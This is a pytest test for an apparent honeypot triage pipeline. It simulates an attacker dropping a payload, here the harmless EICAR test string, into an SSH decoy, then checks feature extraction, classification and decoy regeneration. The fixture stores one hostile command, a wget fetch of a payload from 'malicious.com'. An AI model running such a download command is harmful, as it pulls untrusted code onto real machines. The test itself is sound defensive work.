import os
import time
import pytest
import asyncio
import threading
from unittest.mock import MagicMock, AsyncMock
from core.triage.watcher import TriageWatcher
from agents.decision import build_hybrid_classifier
from interceptor.session_store import SessionStore
from orchestrator.main import load_config

@pytest.fixture
def config():
    return load_config("config/settings.yaml")

@pytest.fixture
def store(tmp_path):
    db_path = tmp_path / "test_store.db"
    return SessionStore(str(db_path))

@pytest.mark.asyncio
async def test_payload_drop_classification(tmp_path, config, store):
    """
    Simulates a payload being downloaded into a decoy, 
    verifying that the TriageWatcher picks it up, runs static analysis, 
    re-classifies the session, and triggers LLM generation.
    """
    # 1. Setup mock classifier (we use the real hybrid pipeline if possible)
    classifier = build_hybrid_classifier()
    
    # 2. Setup mock DecoyManager and LLM Builder
    mock_decoy_mgr = MagicMock()
    mock_decoy = MagicMock()
    mock_decoy.host_dir = str(tmp_path / "decoy_ssh" / "prewarm_1")
    mock_decoy.container_id = "mock_container"
    mock_decoy_mgr.get_or_spawn_ssh_decoy.return_value = mock_decoy
    
    mock_builder = MagicMock()
    mock_builder.prepare_decoy_files = AsyncMock()

    # 3. Create the watch directory structure (as it would be on the host)
    watch_dir = tmp_path / "decoy_ssh"
    session_dir = watch_dir / "prewarm_1"
    downloads_dir = session_dir / "downloads"
    downloads_dir.mkdir(parents=True)
    
    # Write the attacker's actual session ID into session_id.txt
    real_session_id = store.get_or_create_session("192.168.1.100")
    with open(session_dir / "session_id.txt", "w") as f:
        f.write(real_session_id)
        
    # Pre-populate command history so the model knows the context
    store.append_command_history(real_session_id, "wget http://malicious.com/payload.bin")

    # 4. Start the TriageWatcher
    watcher = TriageWatcher(
        watch_dir=str(watch_dir),
        store=store,
        classifier=classifier,
        builder=mock_builder,
        decoy_mgr=mock_decoy_mgr
    )
    watcher.start()
    
    try:
        # 5. Drop the payload (EICAR string for predictable entropy)
        payload_path = downloads_dir / "payload.bin"
        with open(payload_path, "w") as f:
            f.write("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
            
        # Give watchdog time to detect and process
        await asyncio.sleep(2.0)
        
        # 6. Verifications
        # Verify store was updated with triage features
        cur = store.conn.cursor()
        cur.execute("SELECT context_json FROM sessions WHERE id = ?", (real_session_id,))
        row = cur.fetchone()
        assert row is not None, "Session should exist in store"
        import json
        context = json.loads(row[0])
        assert "triage_features" in context
        
        # EICAR is a tiny text string, so entropy is non-zero but file is very small.
        # Just verifying the pipeline extracted exactly 12 features.
        assert len(context["triage_features"]) == 12
        
        # Verify the LLM was triggered to regenerate the decoy
        mock_builder.prepare_decoy_files.assert_called_once()
        
        # Check the decision object passed to the builder
        called_args = mock_builder.prepare_decoy_files.call_args[0]
        assert called_args[0] == real_session_id
        decision_dict = called_args[1]
        
        # It should be flagged as Downloader (or Exploit) because of wget + the payload drop
        assert decision_dict["label"] in ["Downloader", "Exploit"]
        assert decision_dict.get("triage_enriched") is True
        
    finally:
        watcher.stop()
